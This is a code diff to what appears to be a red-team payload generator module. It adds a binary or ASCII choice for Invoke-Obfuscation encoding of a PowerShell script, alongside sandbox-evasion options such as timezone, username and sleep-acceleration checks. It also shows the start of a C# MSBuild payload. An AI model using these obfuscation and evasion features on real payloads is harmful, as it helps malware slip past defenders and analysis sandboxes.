@@ -45,7 +45,7 @@ class PayloadModule:
             "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
             "USERNAME"       : ["X", "Optional: The required user account"],
             "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"],
-            "OBFUSCATION"    : ["X", "Optional: Use python Invoke-Obfuscation on the powershell script"]
+            "OBFUSCATION"    : ["X", "Optional: Use python Invoke-Obfuscation on the powershell script (binary or ascii)"]
                                 }
 
     def generate(self):
@@ -70,10 +70,16 @@ class PayloadModule:
                 if self.required_options["FUNCTION"][0] != "x":
                     # Append FUNCTION to end of script
                     the_script += "\n{0}".format(self.required_options["FUNCTION"][0])
-                    the_script = invoke_obfuscation.asciiEncode(the_script)
+                    if self.required_options["OBFUSCATION"][0].lower() == "binary":
+                        the_script = invoke_obfuscation.binaryEncode(the_script)
+                    elif self.required_options["OBFUSCATION"][0].lower() == "ascii":
+                        the_script = invoke_obfuscation.asciiEncode(the_script)
                     self.required_options["FUNCTION"][0] = "x"
                 else:
-                    the_script = invoke_obfuscation.asciiEncode(the_script)
+                    if self.required_options["OBFUSCATION"][0].lower() == "binary":
+                        the_script = invoke_obfuscation.binaryEncode(the_script)
+                    elif self.required_options["OBFUSCATION"][0].lower() == "ascii":
+                        the_script = invoke_obfuscation.asciiEncode(the_script)
                     self.required_options["FUNCTION"][0] = "x"
 
 
@@ -119,7 +125,11 @@ class PayloadModule:
             """.format(targetName, className, "None")
 
             if self.required_options["OBFUSCATION"][0].lower() != "x":
-                the_script = invoke_obfuscation.asciiEncode(the_script)
+                if self.required_options["OBFUSCATION"][0].lower() == "binary":
+                    the_script = invoke_obfuscation.binaryEncode(the_script)
+                elif self.required_options["OBFUSCATION"][0].lower() == "ascii":
+                    the_script = invoke_obfuscation.asciiEncode(the_script)
+
 
         #required syntax at the beginning of any/all payloads
         payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Threading; using System.IO; using System.Reflection; using System.Runtime.InteropServices; using System.Collections.ObjectModel; using System.Management.Automation; using System.Management.Automation.Runspaces; using System.Text; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n"
